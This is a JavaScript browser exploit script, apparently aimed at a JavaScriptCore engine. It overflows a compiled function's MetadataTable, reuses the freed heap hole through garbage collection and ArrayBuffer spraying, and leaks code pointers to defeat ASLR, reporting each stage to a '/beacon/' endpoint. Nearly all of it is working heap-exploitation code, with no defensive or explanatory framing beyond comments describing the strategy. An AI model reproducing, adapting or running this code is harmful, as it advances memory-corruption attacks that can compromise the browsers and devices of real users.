// p317 - MetadataTable overflow: double-compile hole-reuse strategy
//
// Strategy:
// 1. Compile function_1 (38M calls) -> MetadataTable_1 at addr P1 (100112 bytes in marge)
// 2. Null function_1 + GC -> MetadataTable_1 freed, P1 = 100112-byte hole
// 3. Spray 200000-byte ArrayBuffers -> too big for 100112 hole, go to HIGHER addrs
// 4. Compile function_2 (38M calls) -> MetadataTable_2 fills P1 hole (100112 fits!)
// 5. Forward sweep from P1 hits spray at higher addresses -> overwrite markers
// 6. Scan spray -> thunk pointers -> ASLR leak
//
// The key insight: marge bitfit is first-fit. The 100112-byte freed slot is
// too small for 200000-byte spray buffers, so they skip it. But the second
// MetadataTable (also 100112 bytes) fits perfectly.
//
// Beacon prefix: V317-

(function() {
  function B(tag, body) {
    try {
      var u = '/beacon/V317-' + tag + '?t=' + Date.now();
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch (e) {
      try { new Image().src = '/beacon/V317-' + tag; } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  // Phase 1: Compile function_1 to establish MetadataTable position
  // Using a smaller function (still triggers overflow but doesn't need to be 38M)
  var N1 = 38348816;
  var CHUNK = 4000000;
  var nChunks = Math.floor(N1 / CHUNK);
  var rem = N1 - nChunks * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts1 = new Array(nChunks + 3);
  parts1[0] = 'window.__p317fn1=function(a){';
  for (var c = 0; c < nChunks; c++) parts1[1 + c] = callChunk;
  parts1[nChunks + 1] = 'a();'.repeat(rem);
  parts1[nChunks + 2] = '};window.__p317phase2();';

  var blob1 = new Blob(parts1, {type: 'application/javascript'});
  var blobMB = Math.round(blob1.size / 1048576);
  parts1 = null;
  callChunk = null;
  B('BLOB1-' + blobMB + 'MB');

  window.__p317phase2 = function() {
    B('COMPILE1-OK');

    // Phase 2: Free MetadataTable_1 by releasing the entire CodeBlock chain
    // Chain: JSFunction -> FunctionExecutable -> CodeBlock -> MetadataTable
    // Need: null function ref + revoke blob URL + remove script element + GC

    // Remove the script element to release SourceProvider cache
    if (window.__p317sc1) {
      window.__p317sc1.remove();
      window.__p317sc1 = null;
    }
    // Revoke blob URL to invalidate SourceProvider
    if (window.__p317url1) {
      URL.revokeObjectURL(window.__p317url1);
      window.__p317url1 = null;
    }
    // Null the function reference
    window.__p317fn1 = null;

    // GC round 1: collect JSFunction
    var gcPressure = [];
    for (var i = 0; i < 100; i++) gcPressure.push(new ArrayBuffer(65536));
    gcPressure = null;
    for (var i = 0; i < 50000; i++) var obj = {a: i, b: [i]};

    B('GC1-DONE');

    setTimeout(function() {
      // GC round 2: collect FunctionExecutable
      var gcP2 = [];
      for (var i = 0; i < 100; i++) gcP2.push(new ArrayBuffer(65536));
      gcP2 = null;
      for (var i = 0; i < 50000; i++) var obj2 = {a: i, b: [i]};

      B('GC2-DONE');

      setTimeout(function() {
        // GC round 3: collect CodeBlock -> MetadataTable freed
        var gcP3 = [];
        for (var i = 0; i < 100; i++) gcP3.push(new ArrayBuffer(65536));
        gcP3 = null;
        for (var i = 0; i < 50000; i++) var obj3 = {a: i, b: [i]};

        B('GC3-DONE');

        setTimeout(function() {
          B('GC-WAIT-DONE');
          doSprayAndCompile2();
        }, 1000);
      }, 1000);
    }, 1000);
  };

  function doSprayAndCompile2() {
    // Phase 3: Spray with 200000-byte buffers (too big for 100112 hole)
    var SPRAY_SZ = 200000;
    var SPRAY_COUNT = 500;
    var MARKER = 0x42; // 'B'
    var bufs = new Array(SPRAY_COUNT);
    var views = new Array(SPRAY_COUNT);

    for (var i = 0; i < SPRAY_COUNT; i++) {
      try {
        bufs[i] = new ArrayBuffer(SPRAY_SZ);
        views[i] = new Uint8Array(bufs[i]);
        // Write markers at stride-112 positions
        for (var m = 12; m + 4 <= SPRAY_SZ; m += 112) {
          views[i][m] = MARKER;
          views[i][m+1] = MARKER;
          views[i][m+2] = MARKER;
          views[i][m+3] = MARKER;
        }
      } catch (e) {
        B('SPRAY-ERR-' + i);
        break;
      }
    }
    B('SPRAY-' + bufs.length + '-SZ-' + SPRAY_SZ);

    // Phase 4: Compile function_2 (same 38M calls)
    // MetadataTable_2 should fill the freed 100112-byte hole at P1
    // Forward sweep from P1 goes through spray at higher addresses
    var N2 = 38348816;
    var CHUNK2 = 4000000;
    var nChunks2 = Math.floor(N2 / CHUNK2);
    var rem2 = N2 - nChunks2 * CHUNK2;

    var callChunk2 = 'a();'.repeat(CHUNK2);
    var parts2 = new Array(nChunks2 + 3);
    parts2[0] = 'window.__p317fn2=function(a){';
    for (var c = 0; c < nChunks2; c++) parts2[1 + c] = callChunk2;
    parts2[nChunks2 + 1] = 'a();'.repeat(rem2);
    parts2[nChunks2 + 2] = '};window.__p317scan();';
    callChunk2 = null;

    var blob2 = new Blob(parts2, {type: 'application/javascript'});
    var blob2MB = Math.round(blob2.size / 1048576);
    parts2 = null;
    B('BLOB2-' + blob2MB + 'MB');

    window.__p317scan = function() {
      B('COMPILE2-OK');

      // Phase 5: Scan spray buffers for sweep overwrite
      var hitBufs = 0;
      var leaks = [];
      var firstHitIdx = -1;

      for (var vi = 0; vi < SPRAY_COUNT; vi++) {
        var view = views[vi];
        if (!view || !view.buffer || view.buffer.byteLength !== SPRAY_SZ) continue;

        var hasOverwrite = false;
        for (var q = 12; q + 4 <= SPRAY_SZ && !hasOverwrite; q += 112) {
          var v = u32(view, q);
          if (v !== 0x42424242 && v !== 0x00000000) hasOverwrite = true;
        }
        if (!hasOverwrite) continue;

        if (firstHitIdx < 0) firstHitIdx = vi;
        hitBufs++;

        if (leaks.length >= 10) continue;

        // Find entry alignment
        var bestBase = -1;
        var bestHits = 0;
        for (var tryBase = 0; tryBase < 112; tryBase++) {
          var hits = 0;
          for (var off = tryBase + 12; off + 4 <= SPRAY_SZ; off += 112) {
            if (u32(view, off) === 0xFFFFFFFF) hits++;
          }
          if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
        }

        if (bestBase < 0 || bestHits < 3) continue;

        // Read m_slowPathCallDestination at base+24 (8 bytes, pointer)
        for (var off = bestBase + 24; off + 8 <= SPRAY_SZ; off += 112) {
          var ptr = hex8(view, off);
          if (ptr !== '0000000000000000') {
            leaks.push('B' + vi + '-O' + off + '-P' + ptr);
            break;
          }
        }
      }

      B('RESULT-bufs' + hitBufs + '-leaks' + leaks.length + '-first' + firstHitIdx);

      for (var i = 0; i < leaks.length; i++) {
        B('LEAK-' + i + '-' + leaks[i]);
      }

      if (hitBufs === 0) {
        // Diagnostic
        var intact = 0, zeroed = 0, modified = 0;
        for (var vi = 0; vi < Math.min(200, SPRAY_COUNT); vi++) {
          var view = views[vi];
          if (!view || !view.buffer) continue;
          var v = u32(view, 12);
          if (v === 0x42424242) intact++;
          else if (v === 0x00000000) zeroed++;
          else modified++;
        }
        B('DIAG-I' + intact + '-Z' + zeroed + '-M' + modified);
        if (modified > 0) {
          for (var vi = 0; vi < Math.min(200, SPRAY_COUNT); vi++) {
            var view = views[vi];
            if (!view || !view.buffer) continue;
            var v = u32(view, 12);
            if (v !== 0x42424242 && v !== 0x00000000) {
              var dump = 'B' + vi;
              for (var s = 0; s < 5 && s * 112 + 32 <= SPRAY_SZ; s++) {
                dump += '|' + hex8(view, s * 112 + 12) + '-' + hex8(view, s * 112 + 24);
              }
              B('DUMP-' + dump);
              break;
            }
          }
        }
      }

      B('DONE');
    };

    var url2 = URL.createObjectURL(blob2);
    var sc2 = document.createElement('script');
    sc2.onerror = function() { B('SCRIPT2-ERR'); };
    document.head.appendChild(sc2);
    sc2.src = url2;

    setTimeout(function() {
      if (!window.__p317fn2) B('TIMEOUT-NO-COMPILE2');
    }, 60000);
  }

  var url1 = URL.createObjectURL(blob1);
  window.__p317url1 = url1;
  var sc1 = document.createElement('script');
  window.__p317sc1 = sc1;
  sc1.onerror = function() { B('SCRIPT1-ERR'); };
  document.head.appendChild(sc1);
  sc1.src = url1;

  setTimeout(function() {
    if (!window.__p317fn1 && !window.__p317phase2Done) B('TIMEOUT-NO-COMPILE1');
  }, 45000);
})();
